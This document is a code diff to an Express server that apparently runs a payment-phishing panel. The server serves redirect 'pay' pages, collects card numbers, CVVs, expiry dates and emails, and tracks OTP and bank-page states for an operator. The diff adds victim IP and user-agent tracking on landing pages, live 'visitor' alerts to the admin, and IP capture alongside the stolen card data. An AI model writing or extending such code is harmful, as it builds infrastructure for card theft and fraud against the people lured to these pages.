@@ -9,6 +9,9 @@ import fs from 'fs';
 // Generate a unique ID for this server instance
 const SERVER_ID = crypto.randomBytes(3).toString('hex');
 
+// Store visitors
+const visitors = new Map();
+
 // Create HTML redirect files
 function createRedirectFile(targetHtml) {
   const fileName = `pay${SERVER_ID}.html`;
@@ -43,6 +46,38 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
+// Middleware to track visitors and their IP addresses
+app.use((req, res, next) => {
+  // Get visitor IP address
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  
+  // Track page visits with payment ID
+  if (req.path === '/landing.html' && req.query.pid) {
+    const pid = req.query.pid;
+    const timestamp = new Date().toLocaleString();
+    
+    // Store visitor info
+    visitors.set(pid, { 
+      ip, 
+      timestamp, 
+      url: req.originalUrl, 
+      userAgent: req.headers['user-agent'] 
+    });
+    
+    // Notify admin of visitor
+    if (io) {
+      io.emit('visitor', { 
+        pid, 
+        ip, 
+        timestamp, 
+        url: req.originalUrl 
+      });
+    }
+  }
+  
+  next();
+});
+
 // Serve static files
 app.use(express.static("."));
 
@@ -55,6 +90,14 @@ const server = app.listen(PORT, () => {
 const io = new Server(server);
 const transactions = new Map();
 const paymentLinks = new Map();
+
+// Endpoint to get visitor info
+app.get('/api/visitors', (req, res) => {
+  res.json(Array.from(visitors.entries()).map(([pid, data]) => ({
+    pid,
+    ...data
+  })));
+});
 
 // Payment Links Endpoints - ONLY modify this function
 app.post('/api/generatePaymentLink', (req, res) => {
@@ -89,16 +132,7 @@ app.post('/api/generatePaymentLink', (req, res) => {
   }
 });
 
-// The rest of your code remains completely unchanged
-app.get('/api/getPaymentDetails', (req, res) => {
-  const { pid } = req.query;
-  if (!pid || !paymentLinks.has(pid)) {
-    return res.status(404).json({ status: "error", message: "Not found" });
-  }
-  res.json({ status: "success", payment: paymentLinks.get(pid) });
-});
-
-// Transactions Endpoints
+// Add IP address to transaction data
 app.post('/api/sendPaymentDetails', (req, res) => {
   try {
     const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
@@ -108,6 +142,9 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     }
 
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
+    
+    // Get IP address
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
     const transaction = {
       id: invoiceId,
@@ -124,7 +161,8 @@ app.post('/api/sendPaymentDetails', (req, res) => {
       otpError: false,
       redirectStatus: null,
       bankpageVisible: false,
-      timestamp: new Date().toLocaleString()
+      timestamp: new Date().toLocaleString(),
+      ip: ip  // Add IP address
     };
 
     transactions.set(invoiceId, transaction);
@@ -134,6 +172,15 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     console.error('Transaction Error:', error);
     res.status(500).json({ status: "error", message: "Payment processing failed" });
   }
+});
+
+// The rest of your code remains completely unchanged
+app.get('/api/getPaymentDetails', (req, res) => {
+  const { pid } = req.query;
+  if (!pid || !paymentLinks.has(pid)) {
+    return res.status(404).json({ status: "error", message: "Not found" });
+  }
+  res.json({ status: "success", payment: paymentLinks.get(pid) });
 });
 
 app.get('/api/transactions', (req, res) => {
